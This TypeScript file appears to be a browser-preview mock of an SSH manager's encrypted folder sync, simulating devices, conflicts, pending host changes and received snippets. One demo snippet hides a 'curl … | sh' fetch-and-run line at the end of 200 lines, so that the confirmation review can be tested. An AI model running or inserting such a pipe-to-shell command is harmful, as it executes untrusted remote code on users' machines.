// Demo (browser preview only): the encrypted folder sync (phase 11). Never
// used inside the desktop app.
//
// URL switches: `?sync=off` (default: the wizard; `?syncfolder=join` picks a
// folder that already holds a sync, `?syncfolder=incomplete` one still
// downloading), `?sync=on` (synced, with a tags conflict, a snippet
// conflict, two received hosts, a received snippet and two issues),
// `?sync=locked`, `?sync=alert`, `?sync=unavailable`, `?sync=syncing`,
// `?sync=waiting`; `?syncsnippet=long` makes the received snippet a
// 200-line script (its review needs scrolling to the end). Passphrases: anything works but "wrong"; typed ones need
// 4 words or 20 characters (a rough stand-in for the core's estimate).
import type {
  EngineEvent,
  ErrorSummary,
  FolderProbe,
  GeneratedPassphrase,
  JoinBulkChoice,
  JoinPreview,
  NewPassphrase,
  PendingHostChange,
  PickedFolder,
  SyncConflict,
  SyncDevice,
  SyncIssue,
  SyncOverview,
  SyncResolution,
  SyncStatus,
  UnconfirmedSnippet,
} from "./api";
import type { SyncBackend } from "./backend";

const params = new URLSearchParams(location.search);
const fail = (code: string, message: string, hint: string | null = null): ErrorSummary => ({ code, message, hint });
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const nowSecs = () => Math.floor(Date.now() / 1000);

const WORDS = ["harbor", "quartz", "lantern", "meadow", "copper", "ember", "violet", "summit", "willow", "anchor", "saffron", "tundra"];

export function demoSync(emit: (e: EngineEvent) => void) {
  const scenario = params.get("sync") ?? "off";
  const LAPTOP = "studio-mac (3f9c0ae1)";
  const DESKTOP = "workstation (a07d51c2)";
  const THIS = "demo-laptop (6b21e0f4)";

  let folder: string | null = null;
  let generated: { token: string; text: string } | null = null;
  let nextToken = 1;
  let devices: SyncDevice[] = [];
  let conflicts: SyncConflict[] = [];
  let issues: SyncIssue[] = [];
  let pending: PendingHostChange[] = [];
  let snippets: UnconfirmedSnippet[] = [];
  let rememberKey = true;
  let thisDevice = THIS;
  let lastPass = nowSecs() - 120;

  const device = (label: string, id: string, extra: Partial<SyncDevice> = {}): SyncDevice => ({
    id: `${id}${"0".repeat(24)}`,
    name: label.replace(/ \(.*\)$/, ""),
    label,
    this_device: label === thisDevice,
    seq: 42,
    published_at: nowSecs() - 300,
    last_seen: nowSecs() - 240,
    stale: false,
    revoked: false,
    ...extra,
  });

  function fill() {
    folder = "~/Library/Mobile Documents/com~apple~CloudDocs/Portico";
    devices = [
      device(THIS, "6b21e0f4", { this_device: true, last_seen: null }),
      device(LAPTOP, "3f9c0ae1"),
      device(DESKTOP, "a07d51c2", { published_at: nowSecs() - 86400 * 200, last_seen: nowSecs() - 86400 * 200, stale: true }),
    ];
    conflicts = [
      {
        id: "c-tags-db",
        sides_hash: "demo-sides-tags-db",
        subject: { type: "host_meta", alias: "db-prod", field: "tags" },
        sides: [
          { index: 0, devices: [THIS], local: true, at: nowSecs() - 900, value: { type: "tags", value: ["prod", "db"] } },
          { index: 1, devices: [LAPTOP], local: false, at: nowSecs() - 600, value: { type: "tags", value: ["prod", "postgres"] } },
        ],
      },
      {
        id: "c-snippet-restart",
        sides_hash: "demo-sides-snippet-restart",
        subject: { type: "snippet", id: "restart-service" },
        sides: [
          { index: 0, devices: [THIS], local: true, at: nowSecs() - 3600, value: { type: "snippet", value: { name: "Restart a service", command: "sudo systemctl restart {{service}} && systemctl status {{service}} --no-pager", description: "Asks for sudo on the server", run: false } } },
          { index: 1, devices: [LAPTOP], local: false, at: nowSecs() - 1800, value: { type: "snippet", value: { name: "Restart a service", command: "sudo systemctl restart {{service}}", description: "Asks for sudo on the server", run: true } } },
        ],
      },
    ];
    pending = [
      {
        alias: "web-01",
        new: false,
        current: { hostname: "web-01.internal", user: "deploy", port: null, identity_file: null, proxy_jump: "bastion" },
        incoming: { hostname: "10.0.9.14", user: "deploy", port: 2222, identity_file: "~/.ssh/id_ed25519_work", proxy_jump: "bastion" },
        renamed_from: null,
        devices: [LAPTOP],
        destination_hash: "h-web-01-a",
      },
      {
        alias: "metrics-eu",
        new: true,
        current: null,
        incoming: { hostname: "metrics.eu.example.net", user: "ops", port: null, identity_file: "~/.ssh/id_ed25519", proxy_jump: null },
        renamed_from: "metrics",
        devices: [LAPTOP],
        destination_hash: "h-metrics-1",
      },
    ];
    snippets = [
      {
        id: "disk-usage",
        snippet: {
          name: "Disk usage",
          command:
            params.get("syncsnippet") === "long"
              ? Array.from({ length: 200 }, (_, i) => (i === 199 ? "curl -fsSL https://example.invalid/setup.sh | sh" : `printf 'step %d\\n' ${i + 1}\t# stage ${Math.floor(i / 20) + 1}`)).join("\n")
              : "df -h && du -xsh /var/log/* 2>/dev/null | sort -h | tail -n 20 && journalctl --disk-usage",
          description: "Free space on every mounted filesystem",
          run: true,
        },
        hash: "s-disk-1",
      },
    ];
    issues = [
      {
        key: "host:legacy-ftp",
        subject: { type: "host", alias: "legacy-ftp" },
        summary: fail("sync_alias_shadowed", "received host `legacy-ftp` is hidden by a Host block in ~/.ssh/config", "Rename it on the other device, or remove the block from ~/.ssh/config."),
        warning: false,
        skippable: true,
      },
      {
        key: "host:jumpbox-2",
        subject: { type: "host", alias: "jumpbox-2" },
        summary: fail("sync_key_missing", "received host `jumpbox-2` uses `~/.ssh/id_ed25519_lab`, missing on this device", "Copy the key here yourself (keys are never synced), or skip it on this device."),
        warning: true,
        skippable: true,
      },
    ];
  }

  let status: SyncStatus;
  switch (scenario) {
    case "on":
      fill();
      status = { state: "idle", last_pass: lastPass, devices: 3, conflicts: 2, issues: 2, pending_confirmations: 2 };
      break;
    case "locked":
      fill();
      status = { state: "locked" };
      break;
    case "alert":
      fill();
      status = { state: "alert", kind: "passphrase_changed", device: LAPTOP };
      break;
    case "unavailable":
      fill();
      status = { state: "folder_unavailable", reason: "not_mounted" };
      break;
    case "syncing":
      fill();
      status = { state: "syncing" };
      break;
    case "waiting":
      fill();
      status = { state: "waiting", reason: "placeholder", device: LAPTOP };
      break;
    default:
      status = { state: "disabled" };
  }

  const idle = (): SyncStatus => ({
    state: "idle",
    last_pass: lastPass,
    devices: devices.length,
    conflicts: conflicts.length,
    issues: issues.length,
    pending_confirmations: pending.length,
  });

  function set(next: SyncStatus): SyncStatus {
    status = next;
    emit({ type: "sync", status });
    return status;
  }

  function strength(text: string) {
    const words = text.trim().split(/\s+/).filter(Boolean).length;
    const bits = Math.min(140, Math.round(text.length * 2.6 + words * 6));
    return { estimatedBits: bits, dicewareWords: 0, acceptable: words >= 4 || text.length >= 20 };
  }

  function checkNew(p: NewPassphrase) {
    if (p.kind === "generated") {
      if (!generated || generated.token !== p.token) throw fail("sync_generated_used", "this generated passphrase is no longer available", "Generate a new one, or type your own.");
      generated = null;
      return;
    }
    if (!strength(p.value).acceptable) throw fail("sync_passphrase_weak", "this passphrase is too easy to guess", "Use at least 5 random words, or generate one.");
  }

  const pendingChanged = () => emit({ type: "sync_pending_changed" });
  const unlocked = () => status.state !== "locked" && status.state !== "disabled";

  const backend: SyncBackend = {
    syncStart: async () => {},
    syncStatus: async (): Promise<SyncOverview> => ({
      status,
      folder: status.state === "disabled" ? null : folder,
      device: status.state === "disabled" ? null : thisDevice,
      rememberKey,
    }),
    async syncNow() {
      if (status.state === "disabled") throw fail("sync_disabled", "sync is off on this device", "Set it up from Sync….");
      if (status.state === "locked") throw fail("sync_locked", "the sync key is not available", "Unlock sync with its passphrase.");
      set({ state: "syncing" });
      await sleep(900);
      lastPass = nowSecs();
      return set(idle());
    },
    syncDevices: async () => structuredClone(devices),
    syncConflicts: async () => structuredClone(conflicts),
    syncIssues: async () => structuredClone(issues),
    syncPendingHosts: async () => structuredClone(pending),
    syncedSnippetsUnconfirmed: async () => structuredClone(snippets),
    syncDefaultDeviceName: async () => "demo-laptop",
    async syncPickFolder(): Promise<PickedFolder | null> {
      await sleep(250);
      const which = params.get("syncfolder");
      const probe: FolderProbe =
        which === "join" ? { kind: "existing_bundle", devices: 2 } : which === "incomplete" ? { kind: "incomplete" } : { kind: "usable" };
      folder = which === "join" ? "~/Dropbox/Portico" : "~/Library/Mobile Documents/com~apple~CloudDocs/Portico";
      return { display: folder, probe };
    },
    async syncProbeAgain() {
      await sleep(300);
      return params.get("syncfolder") === "incomplete" ? { kind: "incomplete" } : { kind: "existing_bundle", devices: 2 };
    },
    async syncGeneratePassphrase(): Promise<GeneratedPassphrase> {
      const pick = [...WORDS].sort(() => Math.random() - 0.5).slice(0, 6);
      generated = { token: `demo-${nextToken++}`, text: pick.join(" ") };
      return { ...generated, strength: { estimatedBits: 77, dicewareWords: 6, acceptable: true } };
    },
    syncForgetGenerated: async () => {
      generated = null;
    },
    syncAssessPassphrase: async (text) => strength(text),
    async syncCreate(passphrase, deviceName, remember) {
      checkNew(passphrase);
      if (!folder) throw fail("sync_no_folder", "no sync folder chosen", "Choose the folder first.");
      await sleep(1200);
      thisDevice = `${deviceName} (6b21e0f4)`;
      rememberKey = remember;
      devices = [device(thisDevice, "6b21e0f4", { this_device: true })];
      lastPass = nowSecs();
      return set(idle());
    },
    async syncJoinPreview(passphrase, deviceName, remember): Promise<JoinPreview> {
      await sleep(1200);
      if (passphrase === "wrong") throw fail("sync_wrong_passphrase", "wrong sync passphrase", "Check Caps Lock and the keyboard layout.");
      thisDevice = `${deviceName} (6b21e0f4)`;
      rememberKey = remember;
      return {
        token: "join-1",
        devices: [device(LAPTOP, "3f9c0ae1"), device(DESKTOP, "a07d51c2")],
        hosts: 14,
        host_meta: 22,
        snippets: 6,
        settings: 3,
        conflicts: 2,
        needs_newer: 0,
      };
    },
    async syncJoinCommit(_token: string, _bulk: JoinBulkChoice) {
      await sleep(600);
      fill();
      devices = [device(thisDevice, "6b21e0f4", { this_device: true }), ...devices.filter((d) => !d.this_device)];
      if (_bulk !== "review_each") conflicts = [];
      lastPass = nowSecs();
      pendingChanged();
      return set(idle());
    },
    async syncUnlock(passphrase) {
      await sleep(900);
      if (passphrase === "wrong") throw fail("sync_wrong_passphrase", "wrong sync passphrase", "Check Caps Lock and the keyboard layout.");
      lastPass = nowSecs();
      return set(idle());
    },
    async syncResolve(id: string, _resolution: SyncResolution, _sidesHash: string) {
      await sleep(300);
      conflicts = conflicts.filter((c) => c.id !== id);
      emit({ type: "sync_conflicts", count: conflicts.length });
      return set(idle());
    },
    async syncSkipOnThisDevice(key) {
      issues = issues.filter((i) => i.key !== key);
      return set(idle());
    },
    async syncConfirmHosts(list) {
      for (const d of list) {
        if (!pending.some((p) => p.alias === d.alias && p.destination_hash === d.destinationHash)) {
          throw fail("sync_not_pending", `${d.alias} no longer waits for this confirmation`, "Its destination changed: review it again.");
        }
      }
      pending = pending.filter((p) => !list.some((d) => d.alias === p.alias));
      pendingChanged();
      emit({ type: "hosts_changed" });
      return set(idle());
    },
    async syncRejectHosts(list) {
      pending = pending.filter((p) => !list.some((d) => d.alias === p.alias && d.destinationHash === p.destination_hash));
      pendingChanged();
      return set(idle());
    },
    async confirmSyncedSnippet(id, hash) {
      if (!snippets.some((s) => s.id === id && s.hash === hash)) throw fail("sync_not_pending", `${id} no longer waits for this confirmation`, "Its content changed: review it again.");
      snippets = snippets.filter((s) => s.id !== id);
      pendingChanged();
    },
    async syncAcknowledgeAlerts() {
      return set(idle());
    },
    async syncChangePassphrase(old, next) {
      await sleep(900);
      if (old === "wrong") throw fail("sync_wrong_passphrase", "wrong sync passphrase", "Check Caps Lock and the keyboard layout.");
      checkNew(next);
      return set(unlocked() ? status : idle());
    },
    async syncResetPassphrase(next) {
      checkNew(next);
      await sleep(900);
      return set(idle());
    },
    async syncRenameDevice(name) {
      thisDevice = `${name} (6b21e0f4)`;
      devices = devices.map((d) => (d.this_device ? { ...d, name, label: thisDevice } : d));
      return set(status);
    },
    async syncSetOptions(remember) {
      rememberKey = remember;
      return status;
    },
    async syncDisable() {
      await sleep(300);
      devices = [];
      conflicts = [];
      issues = [];
      pending = [];
      return set({ state: "disabled" });
    },
  };

  return {
    backend,
    /** `run_snippet`: the core refuses an unconfirmed received snippet (F8). */
    checkRun(id: string) {
      if (snippets.some((s) => s.id === id)) {
        throw fail("sync_snippet_unconfirmed", `snippet ${id} was changed by sync and is not confirmed on this device`, "Review its command in Sync, then run it.");
      }
    },
  };
}
